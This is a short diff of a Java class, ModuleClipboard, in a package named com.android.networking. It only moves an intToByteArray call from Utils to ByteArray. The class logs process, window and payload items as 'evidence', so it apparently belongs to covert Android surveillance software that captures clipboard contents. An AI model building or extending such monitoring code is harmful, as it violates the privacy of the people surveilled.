@@ -21,9 +21,9 @@ import com.android.networking.conf.ConfModule;
 import com.android.networking.evidence.Evidence;
 import com.android.networking.evidence.EvidenceType;
 import com.android.networking.interfaces.IncrementalLog;
+import com.android.networking.util.ByteArray;
 import com.android.networking.util.Check;
 import com.android.networking.util.DateTime;
-import com.android.networking.util.Utils;
 import com.android.networking.util.WChar;
 
 public class ModuleClipboard extends BaseModule implements IncrementalLog {
@@ -81,7 +81,7 @@ public class ModuleClipboard extends BaseModule implements IncrementalLog {
 		items.add(process);
 		items.add(window);
 		items.add(payload);
-		items.add(Utils.intToByteArray(Evidence.E_DELIMITER));
+		items.add(ByteArray.intToByteArray(Evidence.E_DELIMITER));
 
 		if (Cfg.DEBUG) {
 			Check.asserts(logIncremental != null, "null log"); //$NON-NLS-1$
